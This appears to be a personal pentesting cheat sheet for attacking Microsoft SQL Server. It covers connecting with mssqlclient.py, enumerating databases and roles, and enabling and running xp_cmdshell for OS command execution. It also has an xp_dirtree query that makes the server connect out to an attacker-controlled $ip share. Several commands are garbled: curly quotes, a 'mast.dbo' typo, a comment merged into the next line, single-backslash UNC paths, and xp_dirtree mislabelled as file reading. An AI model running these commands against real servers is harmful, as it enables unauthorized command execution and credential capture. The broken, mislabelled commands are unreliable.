
## Good places
[hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
[pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)

## Warning
Be careful, you can **block accounts** if you fail login several times using an existing username.

## Impacket smb related scripts
If you have credentials:
```bash
# connect to a Microsoft SQL server
mssqlclient.py -port $PORT $domain/$sql_svc 
```

```sql
SELECT @@version					 	-- version check
SELECT DB_NAME()						-- current database
SELECT name FROM master..sysdatabases;	-- list databases
-- Has two comment types
SELECT 1 — comment  
SELECT /*comment*/ 

SELECT is_srvrolemember('sysadmin'); 	-- role check

```

## Command Execution
Check if cmdshell is already active
```sql   
EXEC xp_cmdshell ‘net user’; -- privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
EXEC sp_configure ‘show advanced options’, 1; -- priv  
RECONFIGURE; -- priv  
EXEC sp_configure ‘xp_cmdshell’, 1; -- priv  
RECONFIGURE; -- priv
-- OR
EXEC mast.dbo.xp_cmdshell 'cmd';
```

Arbituary File Reading with xp_dirtree
```sql
declare @q varchar(200); set @q ='\$ip\IppsecIsAwesome\test'; EXEC xp_dirtree @q;--+ 
```
Or
```sql
declare @q varchar(200); set @q ='\$ip\IppsecIsAwesome\test';exec master.dbo.xp_dirtree @q;--+
```

## References
[pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)